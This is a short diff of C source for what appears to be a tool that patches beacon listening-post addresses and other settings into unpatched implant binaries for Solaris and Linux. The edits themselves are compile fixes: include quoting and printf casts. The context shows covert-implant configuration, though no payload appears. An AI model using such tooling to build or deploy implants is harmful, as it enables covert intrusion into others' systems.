@@ -10,7 +10,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <time.h>
-#include <trigger_protocols.h>
+#include "trigger_protocols.h"
 #include "_unpatched_solaris_sparc.h"
 #include "_unpatched_solaris_x86.h"
 #include "_unpatched_linux_x86.h"
@@ -184,7 +184,7 @@ int main(int argc, char **argv)
 
 		case 'a':	// Hostname / IP address of beacon LP
 			if (strlen(optarg) > sizeof(args.beacon_ip)) {
-				printf(" ERROR: Hostname or IP exceeds %d character limit\n", sizeof(args.beacon_ip));
+				printf(" ERROR: Hostname or IP exceeds %d character limit\n", (int)sizeof(args.beacon_ip));
 				return -1;
 			}
 /*
@@ -624,7 +624,7 @@ int patch(char *filename, unsigned char *hexarray, unsigned int arraylen, struct
 	} while (ret != 0);
 
 	p--;
-	printf("  SIG_HEAD found at offset %08X for %s\n", (p - hexarray), filename);
+	printf("  SIG_HEAD found at offset %08x for %s\n", (int)(p - hexarray), filename);
 
 //      memcpy( p + sizeof( SIG_HEAD ), keybuffer, 128 );
 	if (big_endian == 0) {
